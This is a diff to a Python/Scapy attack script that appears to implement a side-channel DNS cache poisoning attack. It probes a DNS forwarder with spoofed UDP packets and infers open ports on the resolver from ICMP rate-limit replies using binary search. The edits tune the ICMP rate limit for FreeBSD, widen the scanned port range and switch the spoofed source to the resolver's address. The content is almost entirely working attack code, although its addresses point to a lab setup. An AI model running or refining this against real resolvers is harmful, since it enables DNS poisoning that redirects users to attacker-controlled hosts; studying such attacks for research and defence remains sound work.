@@ -15,13 +15,13 @@ resolver_ip = '192.168.58.3'
 domain_name = "cool.com"
 local_free_ip = []
 
-ICMP_limit_rate = 50
+ICMP_limit_rate = 200 # for freebsd
 ICMP_recovering_time = .02 # 20 miliseconds
 sleep_time_for_ICMP_refresh = .05 # 50 ms
 wait_time_for_ICMP_reply = .05
 
 MIN_PORT_TO_SCAN = 50000
-MAX_PORT_TO_SCAN = 50100
+MAX_PORT_TO_SCAN = 50500
 
 fixed_src_port_for_attack = 9556
 
@@ -132,10 +132,6 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
     "," + str(number_of_padding_packet))
     
 
-    # this could be optimized
-    # 
-    #time.sleep(sleep_time_for_ICMP_refresh)
-
     start_time = time.perf_counter()
 
     now_port = port_start
@@ -146,7 +142,7 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
     
     for i in range(number_of_probe_packet):
         # Using spoofed ip
-        ip_layer = IP(dst=forwarder_ip, src=RandIP())
+        ip_layer = IP(dst=forwarder_ip, src=resolver_ip)
         udp_layer = UDP(dport=now_port, sport=RandShort())
         packet = Ether() / ip_layer / udp_layer
         probe_packet.append(raw(packet))
@@ -156,7 +152,7 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
     
     for i in range(number_of_padding_packet):
         # Using spoofed ip
-        ip_layer = IP(dst=forwarder_ip, src=RandIP())
+        ip_layer = IP(dst=forwarder_ip, src=resolver_ip)
         udp_layer = UDP(dport=1, sport=RandShort())
         packet = Ether() / ip_layer / udp_layer
         padding_packet.append(raw(packet))
@@ -190,9 +186,10 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
     elapsed_time_for_one_burst = attack_burst_end_time - attack_burst_start_time
 
 
-    if sleep_time_for_ICMP_refresh > elapsed_time_for_one_burst:
-        time.sleep(sleep_time_for_ICMP_refresh - elapsed_time_for_one_burst)
+    #if sleep_time_for_ICMP_refresh > elapsed_time_for_one_burst:
+    #    time.sleep(sleep_time_for_ICMP_refresh - elapsed_time_for_one_burst)
 
+    time.sleep(1)
 
     # if timeout occurs, the reply will be none
     if reply == None:
@@ -203,7 +200,7 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
             print("Yaaay, got ICMP port unreachable message. At least one port is open.")
             return port_start # important for the base condition of the binary search
 
-    return 0 # for now
+    return 0
 
 # dividing range into [left...mid] and [mid + 1...right]
 def binary_search(left, right):
@@ -284,7 +281,7 @@ def main():
     
     iteration = 1
 
-    while finished == 0:
+    while finished == 0 and iteration < 3:
 
         time.sleep(2)
 
